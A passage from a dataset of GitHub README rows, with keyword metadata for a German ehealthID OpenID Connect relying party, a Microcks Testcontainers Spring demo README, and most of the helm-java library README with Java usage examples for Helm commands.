",21,4,44,apache-2.0,67.0,"['openid', 'connect', 'relying', 'party', 'gesundheitsid', 'ehealthid', 'goal', 'provide', 'simple', 'standalone', 'server', 'exposing', 'germany', 'ehealthid', 'good', 'old', 'openid', 'connect', 'relying', 'party', 'oidc', 'rp', 'identity', 'provider', 'keycloak', 'link', 'account', 'oidc', 'authentication', 'flow', 'idp', 'relying', 'party', 'content', 'standalone', 'application', 'act', 'openid', 'connect', 'oidc', 'relying', 'party', 'bridge', 'oidc', 'germany', 'gesundheitsid', 'openid', 'federation', 'script', 'generate', 'key', 'federation', 'registration', 'form', 'ehealthid', 'plain', 'java', 'library', 'build', 'relyingparties', 'gesundheitsid', 'api', 'client', 'model', 'entitystatments', 'idp', 'list', 'endpoint', 'etc', 'narrow', 'support', 'quickstart', 'important', 'relying', 'party', 'must', 'registered', 'within', 'openid', 'federation', 'work', 'fully', 'order', 'register', 'federation', 'entity', 'statment', 'must', 'publicly', 'available', 'server', 'booted', 'expose', 'openid', 'discovery', 'document', 'expose', 'openid', 'federation', 'entity', 'configuration', 'ready', 'handle', 'openid', 'connect', 'flow', 'handle', 'via', 'germany', 'gesundheitsid', 'federation', 'configure', 'identity', 'provider', 'generic', 'setting', 'relying', 'party', 'openid', 'configuration', 'supported', 'client', 'authentication', 'public', 'key', 'discovered', 'example', 'keycloak', 'openid', 'connect', 'identity', 'provider', 'setting', 'example', 'relying', 'party', 'issuer', 'configuration', 'use', 'environment', 'variable', 'configure', 'relying', 'party', 'server', 'required', 'configuration', 'name', 'description', 'example', 'path', 'jwks', 'least', 'one', 'keypair', 'signature', 'entity', 'statement', 'key', 'must', 'registered', 'federation', 'master', 'valid', 'redirection', 'uris', 'openid', 'connect', 'external', 'base', 'uri', 'relying', 'party', 'also', 'towards', 'openid', 'federation', 'additional', 'path', 'unsupported', 'uri', 'discovery', 'document', 'identity', 'provider', 'used', 'fetch', 'public', 'key', 'client', 'authentication', 'uri', 'federation', 'master', 'application', 'name', 'within', 'federation', 'host', 'bind', 'port', 'bind', 'time', 'live', 'entity', 'statement', 'format', 'comma', 'separated', 'list', 'scope', 'requested', 'federation', 'must', 'match', 'registered', 'federation', 'master', 'time', 'live', 'session', 'format', 'maximum', 'number', 'session', 'store', 'keep', 'memory', 'bounded', 'time', 'live', 'code', 'successful', 'logins', 'code', 'redeemed', 'yet', 'format', 'maximum', 'number', 'code', 'store', 'keep', 'memory', 'bounded', 'log', 'level', 'generate', 'key', 'register', 'federation', 'order', 'participate', 'gesundheitsid', 'one', 'need', 'register', 'entity', 'statement', 'idp', 'case', 'relying', 'party', 'simplify', 'matter', 'script', 'generate', 'fresh', 'key', 'well', 'xml', 'necessary', 'register', 'gematik', 'see', 'gematik', 'documentation', 'detail', 'registration', 'process', 'authentication', 'flow', 'involved', 'party', 'note', 'additional', 'interaction', 'within', 'federation', 'complete', 'flow', 'see', 'appflow', 'gematik', 'documentation', 'testing', 'see', 'testing', 'limitation', 'session', 'stored', 'implies', 'rebooting', 'server', 'force', 'user', 'currently', 'restart', 'multiple', 'instance', 'run', 'session', 'must', 'sticky', 'use', 'cookie', 'though', 'would', 'relatively', 'straight', 'forward', 'use', 'database', 'instead', 'tested', 'tu', 'gematik', 'idp', 'due', 'lack', 'option', 'open', 'point', 'test', 'verimi', 'gematik', 'rise', 'ibm', 'idp', 'lack', 'option', 'test', 'currently', 'wishlist', 'accept', 'base', 'uri', 'path', 'mysql', 'postgres', 'backed', 'session', 'code', 'repos', 'pkce', 'flow', 'oidc', 'side', 'integration', 'idp', 'fusionauth', 'helpful', 'link', 'openid', 'federation', 'spec', 'gematik', 'fachdienst', 'specification', 'gematik', 'fedmaster', 'specification', 'gematik', 'sectoral', 'idp', 'specification', 'appflow', 'authentication', 'flow', 'implement', 'sektoraler', 'idp', 'example', 'reference', 'implementation']","['federation', 'openid', 'party', 'relying', 'idp']",12,0,0,"['openid', 'connect', 'relying', 'party', 'gesundheitsid', 'ehealthid', 'authentication', 'flow', 'idp', 'relying', 'party', 'content', 'quickstart', 'uri', 'run', 'registration', 'publicly', 'reachable', 'generate', 'key', 'application', 'keep', 'safe', 'secure', 'string', 'receive', 'gematik', 'part', 'registration', 'process', 'see', 'http', 'generate', 'registration', 'xml', 'exist', 'entity', 'statement', 'print', 'xml', 'registration', 'federation', 'send', 'email', 'attachment', 'gematik', 'see', 'http', 'configure', 'identity', 'provider', 'example', 'keycloak', 'openid', 'connect', 'identity', 'provider', 'setting', 'configuration', 'generate', 'key', 'register', 'federation', 'authentication', 'flow', 'involve', 'party', 'test', 'limitation', 'open', 'point', 'wishlist', 'helpful', 'link']",23,"['registration', 'party', 'generate', 'openid', 'connect']",6,197.0,5.0,"[com.diffplug.spotless:spotless-maven-plugin,maven-assembly-plugin,maven-dependency-plugin,maven-site-plugin,org.apache.maven.plugins:maven-assembly-plugin,org.apache.maven.plugins:maven-clean-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-deploy-plugin,org.apache.maven.plugins:maven-enforcer-plugin,org.apache.maven.plugins:maven-failsafe-plugin,org.apache.maven.plugins:maven-install-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-resources-plugin,org.apache.maven.plugins:maven-shade-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.codehaus.mojo:flatten-maven-plugin,org.jacoco:jacoco-maven-plugin]",0.0,4.0,1.0,12933,23.875,5.758414360508602,"['![Quality Gate Status -> https://sonarcloud.io/api/project_badges/measure?project=oviva-ag_ehealthid-relying-party&metric=alert_status&token=ee904c8acea811b217358c63297ebe91fd6aee14', '![Coverage -> https://sonarcloud.io/api/project_badges/measure?project=oviva-ag_ehealthid-relying-party&metric=coverage&token=ee904c8acea811b217358c63297ebe91fd6aee14', 'registered within the OpenID federation -> https://wiki.gematik.de/pages/viewpage.action?pageId=544316583', 'Gematik documentation -> https://wiki.gematik.de/pages/viewpage.action?pageId=544316583', 'AppFlow -> https://wiki.gematik.de/display/IDPKB/App-App+Flow#AppAppFlow-0-FederationMaster', 'FusionAuth -> https://fusionauth.io/', 'OpenID Federation Spec -> https://openid.net/specs/openid-federation-1_0.html', 'Gematik Fachdienst Specifications -> https://gemspec.gematik.de/docs/gemSpec/gemSpec_IDP_FD/latest/', 'Gematik Fedmaster Specification -> https://gemspec.gematik.de/docs/gemSpec/gemSpec_IDP_FedMaster/latest/', 'Gematik Sectoral IDP Specifications -> https://gemspec.gematik.de/docs/gemSpec/gemSpec_IDP_Sek/latest/', 'AppFlow - Authentication flow to implement -> https://wiki.gematik.de/display/IDPKB/App-App+Flow#AppAppFlow-0-FederationMaster', 'Sektoraler IDP - Examples & Reference Implementation -> https://wiki.gematik.de/display/IDPKB/Sektoraler+IDP+-+Referenzimplementierung+und+Beispiele']",12
microcks/microcks-testcontainers-java-spring-demo,main,"# Microcks Testcontainers Spring Boot Demo

![Microcks Testcontainers Spring demo](./assets/microcks-testcontainers-java-spring-demo.png)

This application is a demonstration on how to integrate Microcks via [Testcontainers]([https://www.testcontainers.com]) within your development inner-loop.

You will work with a Spring Boot application and explore how to:
* Use Microcks for **provisioning third-party API mocks**,
* Use Microcks for **simulating external Kafka events publishers**,
* Write tests using Microcks **contract-testing** features for both **REST/OpenAPI based APIs and Events/AsyncAPI** based messaging

## Table of contents

* [Step 1: Getting Started](step-1-getting-started.md)
* [Step 2: Exploring the app](step-2-exploring-the-app.md)
* [Step 3: Local Development Experience with Microcks](step-3-local-development-experience.md)
* [Step 4: Write Tests for REST](step-4-write-rest-tests.md)
* [Step 5: Write Tests for Async](step-5-write-async-tests.md)

## License Summary

The code in this repository is made available under the MIT license. See the [LICENSE](LICENSE) file for details.
",0,0,5,mit,11.0,"['microcks', 'testcontainers', 'spring', 'boot', 'demo', 'application', 'demonstration', 'integrate', 'microcks', 'via', 'testcontainers', 'within', 'development', 'work', 'spring', 'boot', 'application', 'explore', 'use', 'microcks', 'provisioning', 'api', 'mock', 'use', 'microcks', 'simulating', 'external', 'kafka', 'event', 'publisher', 'write', 'test', 'using', 'microcks', 'feature', 'based', 'apis', 'based', 'messaging', 'table', 'content', 'step', 'getting', 'started', 'step', 'exploring', 'app', 'step', 'local', 'development', 'experience', 'microcks', 'step', 'write', 'test', 'rest', 'step', 'write', 'test', 'async', 'license', 'summary', 'code', 'repository', 'made', 'available', 'mit', 'license', 'see', 'license', 'file', 'detail']","['microcks', 'step', 'write', 'test', 'license']",0,0,1,"['microcks', 'testcontainers', 'spring', 'boot', 'demo', 'table', 'content', 'license', 'summary']",3,"['microcks', 'testcontainers', 'spring', 'boot', 'demo']",0,0.0,1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0,1111,41.0,5.2317073170731705,[],0
manusa/helm-java,main,"# Helm Client for Java

Run Helm commands directly from Java with this client library without the need for a Helm CLI.

It allows you to execute Helm commands directly from Java without requiring a separate Helm installation.
Despite this, it still leverages the native Helm libraries, which are written in Go, to function.
As a result, you can expect the same behavior as you would get from using Helm directly.

## Getting started

Add the dependency to your project:

```xml
<dependency>
  <groupId>com.marcnuri.helm-java</groupId>
  <artifactId>helm-java</artifactId>
  <version>0.0.12</version>
</dependency>
```

Start using it:

```java
public static void main(String... args) {
  new Helm(Paths.get(""path"", ""to"", ""chart"")).install().call();
}
```

Check the features section for more examples and documentation.

## Features

### Create

Equivalent of [`helm create`](https://helm.sh/docs/helm/helm_create/).

Creates a chart directory along with the common files and directories used in a chart.

``` java
Helm.create()
  // Name of the chart to create
  .withName(""test"")
  // Path to the directory where the new chart directory will be created
  .withDir(Paths.get(""/tmp""))
  .call();
```

### Dependency

Equivalent of [`helm dependency`](https://helm.sh/docs/helm/helm_dependency/).

Manage a chart's dependencies.

#### Dependency build

Equivalent of [`helm dependency build`](https://helm.sh/docs/helm/helm_dependency_build/).

Rebuild the chart's on-disk dependencies (`charts/`) based on the Chart.lock file.

``` java
new Helm(Paths.get(""path"", ""to"", ""chart"")).dependency().build()
  // Optionally specify a keyring containing public keys (used for verification)
  .keyring(Paths.get(""path"", ""to"", ""keyring""))
  // Optionally skip refreshing the local repository cache
  .skipRefresh()
  // Optionally verify the packages against signatures
  .verify()
  // Optionally enable verbose output
  .debug()
  .call();
```

#### Dependency list

Equivalent of [`helm dependency list`](https://helm.sh/docs/helm/helm_dependency_list/).

List the dependencies for the given chart.

``` java
new Helm(Paths.get(""path"", ""to"", ""chart"")).dependency().list()
  .getDependencies();
```

#### Dependency update

Equivalent of [`helm dependency update`](https://helm.sh/docs/helm/helm_dependency_update/).

Update chart's on-disk dependencies (`charts/`) to mirror the contents of Chart.yaml.

``` java
new Helm(Paths.get(""path"", ""to"", ""chart"")).dependency().update()
  // Optionally specify a keyring containing public keys (used for verification)
  .keyring(Paths.get(""path"", ""to"", ""keyring""))
  // Optionally skip refreshing the local repository cache
  .skipRefresh()
  // Optionally verify the packages against signatures
  .verify()
  // Optionally enable verbose output
  .debug()
  .call();
```

### Install

Equivalent of [`helm install`](https://helm.sh/docs/helm/helm_install/).

Installs a chart archive.

``` java
// Instantiate the command with chart reference
InstallCommand installCommand = Helm.install(""chart/reference"");
// Instatiate the command with chart archive
InstallCommand installCommand = new Helm(Paths.get(""path"", ""to"", ""chart"")).install();
Release result = installCommand
  // Name of the release to install
  .withName(""release-name"")
  // Optionally generate a release name (and omit the name parameter)
  .generateName()
  // Optionally specify a template for the name generation
  .withNameTemplate(""a-chart-{{randAlpha 6 | lower}}"")
  // Optionally specify a version constraint for the chart version to use.
  .withVersion(""^1.0.0"")
  // Optionally specify the Kubernetes namespace to install the release into
  .withNamespace(""namespace"")
  // Optionally create the namespace if not present
  .createNamespace()
  // Optionally, if set, the installation process deletes the installation on failure
  .atomic()
  // Optionally specify a custom description for the release
  .withDescription(""the-description"")
  // Optionally enable the use of development versions too
  .devel()
  // Optionally update dependencies if they are missing before installing the chart
  .dependencyUpdate()
  // Optionally disable the validation of rendered templates against the Kubernetes OpenAPI Schema
  .disableOpenApiValidation()
  // Optionally enable dry run mode to simulate an install
  .dryRun()
  // Optionally specify the dry run strategy (client, server, or none). If unset, defaults to client
  .withDryRunOption(DryRun.CLIENT)
  // Optionally wait until all Pods are in a ready state, PVCs are bound, Deployments have
  // minimum (Desired minus maxUnavailable) Pods in ready state and Services have an IP
  // address (and Ingress if a LoadBalancer) before marking the release as successful. 
  .waitReady()
  // Optionally set typed values for the chart (can be repeated)
  .set(""key"", ""value"")
  // Optionally specify the path to the kubeconfig file to use for CLI requests
  .withKubeConfig(Paths.get(""path"", ""to"", ""kubeconfig""))
  // Optionally specify an SSL certificate file to identify the registry client
  .withCertFile(Paths.get(""path"", ""to"", ""cert""))
  // Optionally specify an SSL key file to identify the registry client
  .withKey(Paths.get(""path"", ""to"", ""key""))
  // Optionally verify certificates of HTTPS-enabled servers using this CA bundle
  .withCaFile(Paths.get(""path"", ""to"", ""ca""))
  // Optionally skip TLS certificate checks of HTTPS-enabled servers
  .insecureSkipTlsVerify()
  // Optionally allow insecure plain HTTP connections for the chart download
  .plainHttp()
  // Optionally specify a keyring (used for verification)
  .withKeyring(Paths.get(""path"", ""to"", ""keyring""))
  // Optionally enable verbose output
  .debug()
  // Optionally set the path to the file containing repository names and URLs
  // Defaults to ""~/.config/helm/repositories.yaml""
  .withRepositoryConfig(Paths.get(""path"", ""to"", ""config""))
  .call();
```

### Lint

Equivalent of [`helm lint`](https://helm.sh/docs/helm/helm_lint/).

Examine a chart for possible issues.

``` java
LintResult result = new Helm(Paths.get(""path"", ""to"", ""chart"")).lint()
  // Optionally enable strict mode (fail on lint warnings)
  .strict()
  // Optionally enable quiet mode (only show warnings and errors) 
  .quiet()
  .call();
result.isFailed(); // true if linting failed
result.getMessages(); // list of linting messages
```

### List

Equivalent of [`helm list`](https://helm.sh/docs/helm/helm_list/).

Lists all the releases for a specified namespace (uses current namespace context if namespace not specified).

``` java
List<Release> releases = Helm.list()
  // Optionally specify the Kubernetes namespace to list the releases from
  .withNamespace(""namespace"")
  // Optionally specify the path to the kubeconfig file to use for CLI requests
  .withKubeConfig(Paths.get(""path"", ""to"", ""kubeconfig""))
  // Optionally show all releases without any filter applied
  .all()
  // Optionally show releases across all namespaces
  .allNamespaces()
  // Optionally show deployed releases
  // If no other option is specified, this will be automatically enabled
  .deployed()
  // Optionally show failed releases
  .failed()
  // Optionally show pending releases
  .pending()
  // Optionally show superseded releases
  .superseded()
  // Optionally show uninstalled releases (if 'helm uninstall --keep-history' was used)
  .uninstalled()
  // Optionally show releases that are currently being uninstalled
  .uninstalling()
  .call();
```

### Package

Equivalent of [`helm package`](https://helm.sh/docs/helm/helm_package/).

Package a chart directory into a chart archive.

``` java
Path result = new Helm(Paths.get(""path"", ""to"", ""chart"")).package()
  // Optionally specify a target directory
  .destination(Paths.get(""path"", ""to"", ""destination""))
  // Optionally enable signing
  .sign()
  // Optionally specify a key UID (required if signing)
  .withKey(""KEY_UID"")
  // Optionally specify a keyring (required if signing)
  .withKeyring(Paths.get(""path"", ""to"", ""keyring""))
  // Optionally specify a file containing the passphrase for the signing key
  .withPassphraseFile(Paths.get(""path"", ""to"", ""passphrase""))
  .call();
```

### Push

Equivalent of [`helm push`](https://helm.sh/docs/helm/helm_push/).

Upload a chart to a registry.

``` java
Helm.push()
  // Location of the packaged chart (.tgz) to push
  .withChart(Paths.get(""path"", ""to"", ""chart"", ""package""))
  // URI of the remote registry to push the chart to
  .withRemote(""oci://remote-server.example.com:12345"");
  // Optionally specify an SSL certificate file to identify the registry client
  .withCertFile(Paths.get(""path"", ""to"", ""cert""))
  // Optionally specify an SSL key file to identify the registry client
  .withKey(Paths.get(""path"", ""to"", ""key""))
  // Optionally specify an SSL CA bundle file to verify the HTTPS-enabled registry server certificates
  .withCaFile(Paths.get(""path"", ""to"", ""ca""))
  // Optionally skip TLS certificate checks of HTTPS-enabled servers
  .insecureSkipTlsVerify()
  // Optionally use insecure HTTP connections for the chart upload
  .plainHttp()
  // Optionally enable debug mode to print out verbose information
  .debug()
  .call();
```

### Registry

Equivalent of [`helm registry`](https://helm.sh/docs/helm/helm_registry/).

Log in to or log out from a registry.

#### Registry login

Equivalent of [`helm registry login`](https://helm.sh/docs/helm/helm_registry_login/).

Log in to a registry.

``` java
Helm.registry().login()
  // The host to log in to.
  .withHost(""host"")
  // Registry username
  .withUsername(""username"");
  // Registry password or identity token.
  .withPassword(""password"");
  // Optionally specify an SSL certificate file to identify the registry client
  .withCertFile(Paths.get(""path"", ""to"", ""cert""))
  // Optionally specify an SSL key file to identify the registry client
  .withKey(Paths.get(""path"", ""to"", ""key""))
  // Optionally specify an SSL CA bundle file to verify the HTTPS-enabled registry server certificates
  .withCaFile(Paths.get(""path"", ""to"", ""ca""))
  // Optionally skip TLS certificate checks of HTTPS-enabled servers
  .insecureSkipTlsVerify()
  // Optionally use insecure HTTP connections for the chart upload
  .plainHttp()
  // Optionally enable debug mode to print out verbose information
  .debug()
  .call();
```

#### Registry logout

Equivalent of [`helm registry logout`](https://helm.sh/docs/helm/helm_registry_logout/).

Log out from a registry.

``` java
Helm.registry().logout()
  // The host to log out from.
  .withHost(""host"")
  // Optionally enable debug mode to print out verbose information
  .debug()
  .call();
```

### Repo

Equivalent of [`helm repo`](https://helm.sh/docs/helm/helm_repo/).

Add, list, remove, update, and index chart repositories.

#### Repo add

Equivalent of [`helm repo add`](https://helm.sh/docs/helm/helm_repo_add/).

Add a chart repository.

``` java
Helm.repo().add()
  // Optionally set the path to the file containing repository names and URLs
  // Defaults to ""~/.config/helm/repositories.yaml""
  .withRepositoryConfig(Paths.get(""path"", ""to"", ""config""))
  // Name of the repository to add
  .withName(""repo-1"")
  // URL of the repository to add
  .withUrl(URI.create(""https://charts.helm.sh/stable""))
  // Optionally specify a username for HTTP basic authentication
  .withUsername(""user"")
  // Optionally specify a password for HTTP basic authentication
  .withPassword(""pass"")
  // Optionally specify an SSL certificate file to identify the HTTPS client
  .withCertFile(Paths.get(""path"", ""to"", ""cert""))
  // Optionally specify an SSL key file to identify the HTTPS client
  .withKey(Paths.get(""path"", ""to"", ""key""))
  // Optionally verify certificates of HTTPS-enabled servers using this CA bundle
  .withCaFile(Paths.get(""path"", ""to"", ""ca""))
  // Optionally skip TLS certificate checks of HTTPS-enabled servers
  .insecureSkipTlsVerify()
  .call()
```

#### Repo list

Equivalent of [`helm repo list`](https://helm.sh/docs/helm/helm_repo_list/).

List chart repositories.

``` java
List<Repository> respositories = Helm.repo().list()
  // Optionally set the path to the file containing repository names and URLs
  // Defaults to ""~/.config/helm/repositories.yaml""
  .withRepositoryConfig(Paths.get(""path"", ""to"", ""config""))
  .call();
```

#### Repo remove

Equivalent of [`helm repo remove`](https://helm.sh/docs/helm/helm_repo_remove/).

Remove one or more chart repositories.

``` java
Helm.repo().remove()
  // Optionally set the path to the file containing repository names and URLs
  // Defaults to ""~/.config/helm/repositories.yaml""
  .withRepositoryConfig(Paths.get(""path"", ""to"", ""config""))
  // Add a repository name to the list of repos to remove
  .withRepo(""repo-1"")
  // Add another repository name to the list of repos to remove
  .withRepo(""repo-2"")
  .call();
```

#### Repo update

Equivalent of [`helm repo update`](https://helm.sh/docs/helm/helm_repo_update/).

Update information of available charts locally from chart repositories.

``` java
Helm.repo().update()
  // Optionally set the path to the file containing repository names and URLs
  // Defaults to ""~/.config/helm/repositories.yaml""
  .withRepositoryConfig(Paths.get(""path"", ""to"", ""config""))
  // Add a repository name to the list of repos to remove
  .withRepo(""repo-1"")
  // Add another repository name to the list of repos to remove
  .withRepo(""repo-2"")
  .call();
```

### Search

Equivalent of [`helm search`](https://helm.sh/docs/helm/helm_search/).

This command provides the ability to search for Helm charts in various places including the Artifact Hub and the repositories you have added.

#### Repo

Equivalent of [`helm search repo`](https://helm.sh/docs/helm/helm_search_repo/).

Search repositories for a keyword in charts.

``` java
List<SearchResult> results = Helm.search().repo()
  // Optionally set the path to the file containing repository names and URLs
  // Defaults to ""~/.config/helm/repositories.yaml""
  .withRepositoryConfig(Paths.get(""path"", ""to"", ""config""))
  // Optionally set the keyword to match against the repo name, chart name, chart keywords, and description.
  .withKeyword(""keyword"")
  // Optionally use regular expressions for searching.
  .regexp()
  // Optionally search for development versions too (alpha, beta, and release candidate releases).
  .devel()
  // Optionally search using semantic versioning constraints
  .withVersion("">=1.0.0"")
  .call();
```

### Show

Equivalent of [`helm show`](https://helm.sh/docs/helm/helm_show/).

Show information about a chart.

#### Show all

Equivalent of [`helm show all`](https://helm.sh/docs/helm/helm_show_all/).

Show **all** information about a chart.

``` java
// Instantiate the command with chart reference
ShowCommand showCommand = Helm.show(""chart/reference"");
// Instatiate the command with chart archive
ShowCommand showCommand = new Helm(Paths.get(""path"", ""to"", ""chart"")).show();
String result = showCommand.all()
  // Optionally specify a version constraint for the chart version to use.
  .withVersion(""^1.0.0"")
  // Optionally specify an SSL certificate file to identify the registry client
  .withCertFile(Paths.get(""path"", ""to"", ""cert""))
  // Optionally specify an SSL key file to identify the registry client
  .withKey(Paths.get(""path"", ""to"", ""key""))
  // Optionally specify an SSL CA bundle file to verify the HTTPS-enabled registry server certificates
  .withCaFile(Paths.get(""path"", ""to"", ""ca""))
  // Optionally skip TLS certificate checks of HTTPS-enabled servers
  .insecureSkipTlsVerify()
  // Optionally use insecure HTTP connections for the chart upload
  .plainHttp()
  // Optionally enable debug mode to print out verbose information
  .debug()
  .call();
```

#### Show chart

Equivalent of [`helm show chart`](https://helm.sh/docs/helm/helm_show_chart/).

Show the chart's definition.

``` java
String result = new Helm(Paths.get(""path"", ""to"", ""chart"")).show()
  .chart()
  // Optionally specify a version constraint for the chart version to use.
  .withVersion(""^1.0.0"")
  // Optionally specify an SSL certificate file to identify the registry client
  .withCertFile(Paths.get(""path"", ""to"", ""cert""))
  // Optionally specify an SSL key file to identify the registry client
  .withKey(Paths.get(""path"", ""to"", ""key""))
  // Optionally specify an SSL CA bundle file to verify the HTTPS-enabled registry server certificates
  .withCaFile(Paths.get(""path"", ""to"", ""ca""))
  // Optionally skip TLS certificate checks of HTTPS-enabled servers
  .insecureSkipTlsVerify()
  // Optionally use insecure HTTP connections for the chart upload
  .plainHttp()
  // Optionally enable debug mode to print out verbose information
  .debug()
  .call();
```

#### Show CRDs

Equivalent of [`helm show crds`](https://helm.sh/docs/helm/helm_show_crds/).

Show the chart's CRDs.

``` java
String result = new Helm(Paths.get(""path"", ""to"", ""chart"")).show()
  .crds()
  // Optionally specify a version constraint for the chart version to use.
  .withVersion(""^1.0.0"")
  // Optionally specify an SSL certificate file to identify the registry client
  .withCertFile(Paths.get(""path"", ""to"", ""cert""))
  // Optionally specify an SSL key file to identify the registry client
  .withKey(Paths.get(""path"", ""to"", ""key""))
  // Optionally specify an SSL CA bundle file to verify the HTTPS-enabled registry server certificates
  .withCaFile(Paths.get(""path"", ""to"", ""ca""))
  // Optionally skip TLS certificate checks of HTTPS-enabled servers
  .insecureSkipTlsVerify()
  // Optionally use insecure HTTP connections for the chart upload
  .plainHttp()
  // Optionally enable debug mode to print out verbose information
  .debug()
  .call();
```

#### Show README

Equivalent of [`helm show readme`](https://helm.sh/docs/helm/helm_show_readme/).

Show the chart's README.

``` java
String result = new Helm(Paths.get(""path"", ""to"", ""chart"")).show()
  .readme()
  // Optionally specify a version constraint for the chart version to use.
  .withVersion(""^1.0.0"")
  // Optionally specify an SSL certificate file to identify the registry client
  .withCertFile(Paths.get(""path"", ""to"", ""cert""))
  // Optionally specify an SSL key file to identify the registry client
  .withKey(Paths.get(""path"", ""to"", ""key""))
  // Optionally specify an SSL CA bundle file to verify the HTTPS-enabled registry server certificates
  .withCaFile(Paths.get(""path"", ""to"", ""ca""))
  // Optionally skip TLS certificate checks of HTTPS-enabled servers
  .insecureSkipTlsVerify()
  // Optionally use insecure HTTP connections for the chart upload
  .plainHttp()
  // Optionally enable debug mode to print out verbose information
  .debug()
  .call();
```

#### Show values

Equivalent of [`helm show values`](https://helm.sh/docs/helm/helm_show_values/).

Show the chart's values.

``` java
String result = new Helm(Paths.get(""path"", ""to"", ""chart"")).show()
  .values()
  // Optionally specify a version constraint for the chart version to use.
  .withVersion(""^1.0.0"")
  // Optionally specify an SSL certificate file to identify the registry client
  .withCertFile(Paths.get(""path"", ""to"", ""cert""))
  // Optionally specify an SSL key file to identify the registry client
  .withKey(Paths.get(""path"", ""to"", ""key""))
  // Optionally specify an SSL CA bundle file to verify the HTTPS-enabled registry server certificates
  .withCaFile(Paths.get(""path"", ""to"", ""ca""))
  // Optionally skip TLS certificate checks of HTTPS-enabled servers
  .insecureSkipTlsVerify()
  // Optionally use insecure HTTP connections for the chart upload
  .plainHttp()
  // Optionally enable debug mode to print out verbose information
  .debug()
  .call();
```

### Template

Equivalent of [`helm template`](https://helm.sh/docs/helm/helm_template/).

This command renders chart templates locally and displays the output.

``` java
// Instantiate the command with chart reference
TemplateCommand templateCommand = Helm.template(""chart/reference"");
// Instatiate the command with chart archive
TemplateCommand templateCommand = new Helm(Paths.get(""path"", ""to"", ""chart"")).template();
String result = templateCommand
  // Optionally specify a name for the release
  .withName(""release-name"")
  // Optionally specify a version constraint for the chart version to use.
  .withVersion(""^1.0.0"")
  // Optionally specify the Kubernetes namespace for the release
  .withNamespace(""namespace"")
  // Optionally update dependencies if they are missing before installing the chart
  .dependencyUpdate()
  // Optionally set values for the chart
  .set(""key"", ""value"")
  // Optionally specify an SSL certificate file to identify the registry client
  .withCertFile(Paths.get(""path"", ""to"", ""cert""))
  // Optionally specify an SSL key file to identify the registry client
  .withKey(Paths.get(""path"", ""to"", ""key""))
  // Optionally verify certificates of HTTPS-enabled servers using this CA bundle
  .withCaFile(Paths.get(""path"", ""to"", ""ca""))
  // Optionally skip TLS certificate checks of HTTPS-enabled servers
  .insecureSkipTlsVerify()
  // Optionally allow insecure plain HTTP connections for the chart download
  .plainHttp()
  // Optionally specify a keyring (used for verification)
  .withKeyring(Paths.get(""path"", ""to"", ""keyring""))
  // Optionally enable debug mode to print out verbose information
  .debug()
  // Optionally set the path to the file containing repository names and URLs
  // Defaults to ""~/.config/helm/repositories.yaml""
  .withRepositoryConfig(Paths.get(""path"", ""to"", ""config""))
  .call();
```

### Test

Equivalent of [`helm test`](https://helm.sh/docs/helm/helm_test/).

This command runs the tests for a release.

``` java
Release result = Helm.test(""chart/reference"")
  // Optionally specify the time (in seconds) to wait for any individual Kubernetes operation (like Jobs for hooks) (default 300)
  .withTimeout(int timeout)
  // Optionally specify the Kubernetes namespace
  .withNamespace(""namespace"")
  // Optionally specify the path to the kubeconfig file to use for CLI requests
  .withKubeConfig(Paths.get(""path"", ""to"", ""kubeconfig""))
  // Optionally enable verbose output
  .debug()
  .call();
```

### Uninstall

Equivalent of [`helm uninstall`](https://helm.sh/docs/helm/helm_uninstall/).

This command takes a release name and uninstalls the release.

``` java
String result = Helm.uninstall(""chart/reference"")
  // Optionally enable dry run mode to simulate an uninstall
  .dryRun()
  // Optionally prevent hooks from running during uninstallation
  .noHooks()
  // Optionally treat ""release not found"" as a successful uninstall
  .ignoreNotFound()
  // Optionally remove all associated resources and mark the release as deleted, but retain the release history
  .keepHistory()
  // Optionally select the deletion cascading strategy for the dependents. If unset, defaults to background
  .withCascade(Cascade.BACKGROUND)
  // Optionally specify the Kubernetes namespace to uninstall the release from
  .withNamespace(""namespace"")
  // Optionally specify the path to the kubeconfig file to use for CLI requests
  .withKubeConfig(Paths.get(""path"", ""to"", ""kubeconfig""))
  // Optionally enable verbose output
  .debug()
  .call();
```

### Upgrade

Equivalent of [`helm upgrade`](https://helm.sh/docs/helm/helm_upgrade/).

Upgrades a release to a new version of a chart.

``` java
// Instantiate the command with chart reference
UpgradeCommand upgradeCommand = Helm.upgrade(""chart/reference"");
// Instatiate the command with chart archive
UpgradeCommand upgradeCommand = new Helm(Paths.get(""path"", ""to"", ""chart"")).upgrade();
Release result = upgradeCommand
  // Name of the release to upgrade
  .withName(""release-name"")
  // Optionally specify a version constraint for the chart version to use.
  .withVersion(""^1.0.0"")
  // Optionally specify the Kubernetes namespace to upgrade the release
  .withNamespace(""namespace"")
  // Optionally run an installation if a release by this name doesn't already exist
  .install()
  // Optionally force resource updates through a replacement strategy
  .force()
  // Optionally reset the values to the ones built into the chart when upgrading
  .resetValues()
  // Optionally reuse the last release's values and merge in any overrides from the current values when upgrading
  // Ignored if used in combination with resetValues()
  .reuseValues()
  // Optionally reset the values to the ones built into the chart,
  // apply the last release's values and merge in any overrides from the current values when upgrading
  // Ignored if used in combination with resetValues() or reuseValues()
  .resetThenReuseValues()
  // Optionally, if set, upgrade process rolls back changes made in case of failed upgrade
  .atomic()
  // Optionally allow deletion of new resources created in this upgrade when upgrade fails
  .cleanupOnFail()
  // Optionally create the release namespace if not present (if install() is set)
  .createNamespace()
  // Optionally specify a custom description
  .withDescription(""the-description"")
  // Optionally enable the use of development versions too
  .devel()
  // Optionally update dependencies if they are missing before installing the chart
  .dependencyUpdate()
  // Optionally disable the validation of rendered templates against the Kubernetes OpenAPI Schema
  .disableOpenApiValidation()
  // Optionally enable dry run mode to simulate an install
  .dryRun()
  // Optionally specify the dry run strategy (client, server, or none). If unset, defaults to client
  .withDryRunOption(DryRun.CLIENT)
  // Optionally wait until all Pods are in a ready state, PVCs are bound, Deployments have
  // minimum (Desired minus maxUnavailable) Pods in ready state and Services have an IP
  // address (and Ingress if a LoadBalancer) before marking the release as successful. 
  .waitReady()
  // Optionally set typed values for the chart (can be repeated)
  .set(""key"", ""value"")
  // Optionally specify the path to the kubeconfig file to use for CLI requests
  .withKubeConfig(Paths.get(""path"", ""to"", ""kubeconfig""))
  // Optionally specify an SSL certificate file to identify the registry client
